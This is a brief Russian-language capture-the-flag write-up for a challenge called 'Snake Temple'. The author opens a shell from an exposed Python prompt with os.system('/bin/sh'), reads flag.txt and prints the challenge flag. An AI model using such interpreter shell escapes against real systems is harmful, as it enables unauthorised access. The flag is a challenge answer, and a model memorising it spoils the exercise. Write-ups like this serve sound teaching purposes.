# Snake Temple writeup
Это интерактивный питон. Давайте попроубем получить шелл с помощью библиотеки `system`:

```python
>>> from os import system
>>> system("/bin/sh")
```

И это работает, теперь мы можем спокойно посмотреть, что есть на машине:

```bash
$ ls
flag.txt
runner.sh
$ cat flag.txt
li2CTF{5N4K3_15_4N_1nflu3n7__Cr347ur3}
```

Флаг: `li2CTF{5N4K3_15_4N_1nflu3n7__Cr347ur3}`
